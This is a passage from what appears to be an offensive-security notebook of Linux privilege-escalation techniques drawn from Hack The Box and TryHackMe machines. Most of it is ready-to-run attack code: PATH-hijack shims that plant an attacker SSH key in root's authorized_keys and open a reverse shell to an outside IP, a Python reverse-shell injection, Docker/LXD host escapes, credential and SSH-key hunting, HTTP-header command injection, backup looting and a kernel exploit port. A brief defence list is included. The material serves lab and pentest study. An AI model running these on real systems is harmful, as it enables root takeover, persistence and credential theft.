# Check writable directories in PATH
echo $PATH

# If /tmp is in PATH, create a fake binary
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
# Run the SUID binary that calls 'service' without absolute path
```

**Real HTB — sudo + script PATH hijack (Previse — Easy):**

The sudoers rule for `/opt/scripts/access_backup.sh` lacks `secure_path`, so the user's `PATH` is preserved into the root context. The script calls `gzip` (no absolute path), so prefix `PATH` with a directory that contains a malicious `gzip` shim:

```bash
cat > /dev/shm/gzip << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /root/.ssh/authorized_keys
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
EOF
chmod +x /dev/shm/gzip
export PATH=/dev/shm:$PATH
sudo /opt/scripts/access_backup.sh
```

**Real HTB — sudo SETENV + fake `find` (Photobomb — Easy):**

The sudoers rule has `SETENV` set, which lets you pass `PATH=` on the command line even when `secure_path` is configured. The wrapped script calls `find` without an absolute path:

```bash
echo -e '#!/bin/bash\n\nbash' > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

If `find` won't take, try the bare `[` builtin which scripts use for tests:

```bash
echo -e '#!/bin/bash\n\nbash' > '['
chmod +x '['
sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

---

### Docker Group

Being in the `docker` group is equivalent to root.

```bash
# Check group membership
id

# Mount host filesystem via Docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

### LXD Group

```bash
# Check group membership
id | grep lxd

# LXD privesc — build Alpine image on attacker, transfer and import
# On attacker:
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder && sudo bash build-alpine
# Transfer the .tar.gz to target

# On target:
lxc image import ./alpine-v3.x-x86_64.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
# Now inside privileged container with host filesystem at /mnt/root
```

Reference: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

---

### Python Library Hijacking

When a script runs as another user (e.g. via sudo or cron) and imports a Python library that the current user can write to:

```bash
# Find files owned by a target user's group
find / -group <target_group> -type f 2>/dev/null

# Check if a cron/sudo script imports a writable library
# e.g. /usr/lib/python3.8/shutil.py is writable by group 'death'
# and /home/morpheus/restore.py imports shutil and runs via cron as morpheus

# Inject a reverse shell at the top of shutil.py:
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ATTACKER_IP>",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

---

### Stored Credentials

```bash
# Config files
cat /home/user/myvpn.ovpn
cat /etc/openvpn/auth.txt

# Bash history
cat ~/.bash_history | grep -i passw

# Web application configs (common locations)
cat /var/www/html/configuration.php
cat /var/www/html/wp-config.php
cat /var/www/html/config.php

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

---

### CVE-2022-4510 — Binwalk Path Traversal (root-triggered)

`binwalk <= 2.3.2` PFS extractor has a path-traversal flaw; a crafted `.png` (or other binwalk-recognised file) can write arbitrary files when `binwalk -e` extracts it. Useful when a root cron / `inotifywait` watches a directory you can drop files into and runs `binwalk -e` on new arrivals.

**Real chain — Pilgrimage (Easy):**

```bash
# discover the root watchdog with pspy:
./pspy64
# UID=0 ... /usr/local/bin/malwarescan.sh
# malwarescan.sh: inotifywait -m -e create /var/www/.../shrunk/ | while read ...; do binwalk -e "$f"; done

# build payload (public exploit: CVE-2022-4510-WalkingPath):
python walkingpath.py ssh root.png ~/.ssh/id_ed25519.pub

# upload to the watched directory
scp binwalk_exploit.png emily@target:/var/www/pilgrimage.htb/shrunk/

# wait, then SSH as root:
ssh -i ~/.ssh/id_ed25519 root@target
```

---

## Bypasses and Variants

- **CVE-2019-14287 sudo `-u#-1`**: For `(ALL, !root)` sudoers entries on sudo < 1.8.28, `sudo -u#-1 BINARY` runs as UID 0. See `### CVE-2019-14287` section.
- **CVE-2022-4510 binwalk path traversal**: `binwalk -e` on a crafted file writes arbitrary paths; abuse when root runs `binwalk -e` on uploaded files. See section above.
- **Sudo `SETENV` flag**: Per-rule `SETENV` (in the sudoers `Cmnd_Spec`) lets the caller override env-keep, including normally-stripped `PYTHONPATH`, `PERL5LIB`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `XDG_CONFIG_HOME`. `sudo -l` shows it as `SETENV: /path/to/script`.
- **Wildcard cp/tar/rsync argument injection**: `touch -- --preserve=mode`, `touch -- --checkpoint-action=...`, `touch -- --rsh=sh` in a directory the script globs as `*`. See `### Sudo + Script Wildcard / Argument Injection`.
- **AppArmor profile bypass via shebang**: `usr.bin.perl` blocks `perl -e ...` but lets `./script.pl` execute (profile matches the interpreter path, not the script). See Nunchucks example under Capabilities.
- **AF_ALG page-cache write (CVE-2026-31431)**: see dedicated section above.
- **Fail2ban actionban injection**: If the user can run `fail2ban-client` with sudo, inject a command into `actionban` and trigger a ban.
- **Logrotate exploitation** (CVE-2016-1247): From www-data, use symlink attack on nginx log rotation to escalate.
- **SUID with SHELLOPTS (Bash < 4.4)**: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

---

## Detection and Defence

- Audit SUID binaries regularly: `find / -perm -4000 -type f 2>/dev/null`
- Review sudoers file for `NOPASSWD` and wildcard rules
- Ensure cron scripts and their directories are not world-writable
- Monitor for unusual capability assignments (`getcap -r /`)
- Keep kernel patched; use tools like `linux-exploit-suggester` in internal assessments
- Restrict Docker group membership; use rootless Docker where possible
- Never enable `no_root_squash` in NFS exports
- Use read-only mounts for shared Python libraries in multi-user environments

## Tools

- LinPEAS — automated Linux privilege escalation enumeration
- LinEnum — enumeration script
- Linux Exploit Suggester — kernel CVE suggestions
- GTFOBins — SUID/sudo binary exploitation database

## Indirect command injection: root job over a user-controlled file

A root cron/script that reads a data file into an **unquoted** shell expansion is root RCE even
when neither the script nor the file is writable by you, as long as some process writes attacker
data into that file. Example (`/opt/log_checker.sh`, root cron):

```sh
while read ip; do
  /usr/bin/sh -c "echo $ip >> /root/logged";   # $ip unquoted -> command injection
done < /var/www/development/logged
```

The feeder was a web app logging `$_SERVER['HTTP_X_FORWARDED_FOR']` verbatim into that file, so the
injection source is an HTTP header:

```bash
curl http://127.0.0.1:8080/index.php -d 'username=a or a&password=x' \
  -H 'X-Forwarded-For: ;cp /bin/bash /tmp/rootbash;chmod 6755 /tmp/rootbash;'
# wait for the cron, then:
/tmp/rootbash -p        # euid=0
```

Find it with **pspy** (shows the periodic root `sh -c` with no cron-read access needed), then trace
what writes its input file. Any spot where root later `eval`/`sh -c`s a file or field that a
lower-priv process (web app, log, DB row) can influence is the same primitive. Fix: quote (`"$ip"`)
plus validate input.

## Sources

- THM Linux PrivEsc (linuxprivescarena room)
- THM Dreaming — Python library hijacking
- THM GamingServer — LXD privilege escalation
- 0xdf HTB writeups — 25 Easy/Medium Linux machines (Wave 4 ingest):
  - Sudo / GTFOBins: Traverxec (journalctl), Academy (composer), Knife (knife exec), CozyHosting (ssh ProxyCommand), Meta (neofetch + XDG_CONFIG_HOME), SneakyMailer (pip3), Previous (terraform dev_overrides), Admirer (PYTHONPATH via SETENV), Armageddon (snap install --devmode), Blunder (CVE-2019-14287), Photobomb (SETENV + PATH), Previse (PATH hijack on gzip)
  - Sudo + scripted misconfigs: PermX (setfacl symlink), Dynstr (`cp *` wildcard `--preserve=mode`)
  - Cron / writable / service: Epsilon (tar symlink+`-h` race), Slonik (pg_basebackup SUID drop), Inject (ansible-parallel `*.yml`), Spectra (Upstart writable conf)
  - Capabilities: Cap (`cap_setuid` python), Nunchucks (`cap_setuid` perl + AppArmor bypass), Faculty (`cap_sys_ptrace` gdb shellcode injection)
  - SUID: Mango (jjs Nashorn)
  - Group escapes: Tabby (LXD), Shoppy (Docker)
  - CVE-2022-4510 binwalk: Pilgrimage

## Backup-tool loot: borg / borgmatic repository -> host secrets

A root-run backup is an easy-to-miss privesc/loot lead. Enumerate NON-STANDARD installed tools
(`borg`, `borgmatic`, `restic`, `duplicity`, `rsnapshot`) - their presence in a web-app or container
image is a tell that a root backup of `/root` or `/etc` exists nearby.

- **Config leaks the repo passphrase in cleartext.** `borgmatic` stores it in
  `/etc/borgmatic/config.yaml` (or `~/.config/borgmatic/`) as `storage.encryption_passcommand`
  (e.g. `echo <passphrase>`) or `encryption_passphrase`. The config also names the repo
  (`repositories:`) and what is backed up (`source_directories:`, often `/root`).
- **Old archives hold secrets removed from the live FS.** List and read history:
```bash
export BORG_PASSPHRASE='<from the config>'
borg list /path/to/repo                     # archive names (dated)
borg list /path/to/repo::<archive> | grep -iE 'id_(rsa|ed25519|ecdsa)|\.pem|authorized_keys'
borg extract /path/to/repo::<oldest-archive> root/.ssh   # extract only what you need
```
  A root SSH private key present in an OLDER archive but deleted from the current `~/.ssh` is the
  classic find. If host SSH is **publickey-only** (password auth disabled), that recovered key is
  the intended way in: `ssh -i <recovered_key> root@<host>`.
- **Container -> host escape:** the same trick escapes a container when the repo (or the borgmatic
  config) is reachable inside it and the key logs into the HOST's sshd - it beats a hardened-container
  kernel/cgroup escape, so check for the backup FIRST. See [[docker-attacks]].

<!-- promoted-slug: borg-backup-loot-privesc -->

### CVE-2026-31431 copyfail on a Python 3.8 target (os.splice port)

The public copyfail PoCs call `os.splice`, added in **Python 3.10**. On a 3.8 target (very common:
Ubuntu 20.04 ships `/usr/bin/python3` = 3.8) the stock exploit dies with
`AttributeError: module 'os' has no attribute 'splice'`. Port the two splice calls to a direct
syscall via ctypes (x86_64 `__NR_splice = 275`); everything else (AF_ALG bind, `sendmsg`, `recv`)
is stdlib-portable:

```python
import ctypes, os
_libc = ctypes.CDLL(None, use_errno=True); _libc.syscall.restype = ctypes.c_long
def _splice(fd_in, off_in, fd_out, off_out, length, flags=0):
    # off_in/off_out: None -> NULL, else ctypes.byref(ctypes.c_longlong(offset))
    r = _libc.syscall(ctypes.c_long(275), ctypes.c_int(fd_in), off_in,
                      ctypes.c_int(fd_out), off_out, ctypes.c_size_t(length), ctypes.c_uint(flags))
    if r < 0:
        e = ctypes.get_errno(); raise OSError(e, os.strerror(e))
    return r
# os.splice(file_fd, write_end, n, offset_src=0)  ->  _splice(file_fd, ctypes.byref(ctypes.c_longlong(0)), write_end, None, n)
# os.splice(read_end, sock_fd, n)                 ->  _splice(read_end, None, sock_fd, None, n)
```

Verify the precondition before firing (the algif_aead AEAD must instantiate on the target kernel):
```bash
python3 -c 'import socket; socket.socket(38,socket.SOCK_SEQPACKET).bind(("aead","authencesn(hmac(sha256),cbc(aes))"))'  # no error = reachable
```
`os.splice` unavailability is a Python-version issue, not a "not vulnerable" signal - port and re-run.

<!-- promoted-slug: copyfail-py38-splice -->
